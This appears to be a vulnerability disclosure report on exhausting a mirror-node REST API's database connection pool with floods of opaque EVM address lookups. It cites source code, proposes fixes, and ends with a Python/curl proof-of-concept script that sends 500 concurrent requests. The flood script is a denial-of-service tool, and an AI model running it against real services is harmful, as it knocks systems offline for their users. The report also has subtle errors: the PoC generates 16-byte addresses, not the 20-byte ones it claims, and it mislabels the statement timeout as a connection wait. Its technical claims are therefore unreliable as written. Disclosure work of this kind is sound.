### Title
Unauthenticated DB Connection Pool Exhaustion via Opaque EVM Address Flooding in `getEntityIdFromEvmAddress()`

### Summary
The REST API's `getEntityIdFromEvmAddress()` function unconditionally issues a database query for every opaque EVM address lookup, with no per-request rate limiting and a default DB connection pool of only 10 connections. An unauthenticated attacker can flood any endpoint that resolves entity IDs (e.g., `/api/v1/accounts/:id`) with unique opaque EVM addresses in `shard.realm.evmAddress` format, saturating the pool and causing service degradation for all users.

### Finding Description

**Code path:**

In `rest/entityId.js` `parseFromString()` (lines 245–256), when the input is `shard.realm.evmAddress` and shard/realm match the system configuration, the address is classified as "opaque" (returned with `evmAddress` set, `num = null`) if its first 12 bytes are not all zeros:

```js
if (prefix !== longFormEvmAddressPrefix || num > maxNum) {
  return [shard, realm, null, numOrEvmAddress]; // Opaque EVM address
}
``` [1](#0-0) 

In `rest/service/entityService.js` `getEncodedId()` (lines 122–124), any EntityId with a non-null `evmAddress` field unconditionally calls `getEntityIdFromEvmAddress()`:

```js
return entityId.evmAddress === null
  ? entityId.getEncodedId()
  : await this.getEntityIdFromEvmAddress(entityId, requireResult);
``` [2](#0-1) 

`getEntityIdFromEvmAddress()` (lines 90–104) always issues a live DB query with no result caching:

```js
const rows = await this.getRows(EntityService.entityFromEvmAddressQuery, [Buffer.from(entityId.evmAddress, 'hex')]);
``` [3](#0-2) 

The LRU cache in `parseCached()` (lines 314–332) only caches the *parsed EntityId object*, not the DB lookup result. Even repeated identical addresses trigger a fresh DB query on every request. [4](#0-3) 

**No rate limiting on the REST API:** `rest/server.js` registers no rate-limiting middleware — only cors, compression, httpContext, requestLogger, authHandler (response-limit only), metricsHandler, and optional response cache. There is no requests-per-second throttle for unauthenticated callers. [5](#0-4) 

**Tiny DB connection pool:** The default pool cap is 10 connections with a 20-second connection-wait timeout: [6](#0-5) 

Per the configuration docs, `hiero.mirror.rest.db.pool.maxConnections` defaults to **10**. [7](#0-6) 

### Impact Explanation
With 10 DB connections and no rate limiting, an attacker sending ~50–100 concurrent requests/second with unique opaque EVM addresses will keep all pool slots occupied. Legitimate API requests that also require DB access will queue for up to 20 seconds before timing out, effectively rendering the REST API unavailable. This affects all endpoints that resolve entity IDs by EVM address (accounts, contracts, tokens, etc.).

### Likelihood Explanation
No authentication or special privilege is required. Generating unique opaque EVM addresses is trivial (increment any byte of a 20-byte hex string where the first 12 bytes are non-zero). The attack is repeatable, scriptable with any HTTP client (curl, Python requests, wrk), and requires no on-chain interaction or tokens.

### Recommendation
1. **Add per-IP rate limiting middleware** to the REST API (e.g., `express-rate-limit`) before entity-resolution handlers.
2. **Cache DB lookup results** for EVM address → entity ID mappings (e.g., in the existing Redis layer or an in-process LRU cache keyed on the hex address), so repeated lookups for the same address do not hit the DB.
3. **Increase the DB connection pool** size or add a request queue depth limit so pool exhaustion causes fast 503 responses rather than 20-second hangs.

### Proof of Concept

```bash
# Generate 10000 unique opaque EVM addresses and flood the accounts endpoint concurrently
# Any address where first 12 bytes are non-zero is opaque (bypasses long-zero fast path)

python3 - <<'EOF'
import subprocess, random, threading

def flood(i):
    # First 12 bytes non-zero → opaque address → always DB lookup
    addr = f"aa{'00'*11}{i:08x}"  # e.g. aa000000000000000000000000000001
    url = f"http://<mirror-node-host>:5551/api/v1/accounts/0.0.{addr}"
    subprocess.run(["curl", "-s", "-o", "/dev/null", url])

threads = [threading.Thread(target=flood, args=(i,)) for i in range(500)]
for t in threads: t.start()
for t in threads: t.join()
EOF
```

Preconditions: network access to the REST API port (default 5551). No credentials needed.
Trigger: 500 concurrent requests each with a unique opaque EVM address.
Result: DB connection pool saturated; legitimate requests receive 503 or hang for up to 20 seconds.

### Citations

**File:** rest/entityId.js (L252-253)
```javascript
    if (prefix !== longFormEvmAddressPrefix || num > maxNum) {
      return [shard, realm, null, numOrEvmAddress]; // Opaque EVM address
```

**File:** rest/entityId.js (L314-332)
```javascript
const parseCached = (id, allowEvmAddress, evmAddressType, error) => {
  const key = `${id}_${allowEvmAddress}_${evmAddressType}`;
  const value = cache.get(key);
  if (value) {
    return value;
  }

  if (!isValidEntityId(id, allowEvmAddress, evmAddressType)) {
    throw error();
  }
  const [shard, realm, num, evmAddress] =
    id.includes('.') || isValidEvmAddressLength(id.length) ? parseFromString(id, error) : parseFromEncodedId(id, error);
  if (evmAddress === null && (num > maxNum || realm > maxRealm || shard > maxShard)) {
    throw error();
  }

  const entityId = of(shard, realm, num, evmAddress);
  cache.set(key, entityId);
  return entityId;
```

**File:** rest/service/entityService.js (L90-91)
```javascript
  async getEntityIdFromEvmAddress(entityId, requireResult = true) {
    const rows = await this.getRows(EntityService.entityFromEvmAddressQuery, [Buffer.from(entityId.evmAddress, 'hex')]);
```

**File:** rest/service/entityService.js (L122-124)
```javascript
        return entityId.evmAddress === null
          ? entityId.getEncodedId()
          : await this.getEntityIdFromEvmAddress(entityId, requireResult);
```

**File:** rest/server.js (L68-98)
```javascript
app.use(
  express.urlencoded({
    extended: false,
  })
);
app.use(express.json());
app.use(cors());

if (config.response.compression) {
  logger.info('Response compression is enabled');
  app.use(compression());
}

// logging middleware
app.use(httpContext.middleware);
app.useExt(requestLogger);

// authentication middleware - must come after httpContext and requestLogger
app.useExt(authHandler);

// metrics middleware
if (config.metrics.enabled) {
  const {metricsHandler} = await import('./middleware/metricsHandler');
  app.useExt(metricsHandler());
}

// Check for cached response
if (applicationCacheEnabled) {
  logger.info('Response caching is enabled');
  app.useExt(responseCacheCheckHandler);
}
```

**File:** rest/dbpool.js (L7-16)
```javascript
const poolConfig = {
  user: config.db.username,
  host: config.db.host,
  database: config.db.name,
  password: config.db.password,
  port: config.db.port,
  connectionTimeoutMillis: config.db.pool.connectionTimeout,
  max: config.db.pool.maxConnections,
  statement_timeout: config.db.pool.statementTimeout,
};
```

**File:** docs/configuration.md (L556-557)
```markdown
| `hiero.mirror.rest.db.pool.maxConnections`                               | 10                      | The maximum number of clients the database pool can contain                                                                                                                                   |
| `hiero.mirror.rest.db.pool.statementTimeout`                             | 20000                   | The number of milliseconds to wait before timing out a query statement                                                                                                                        |
```
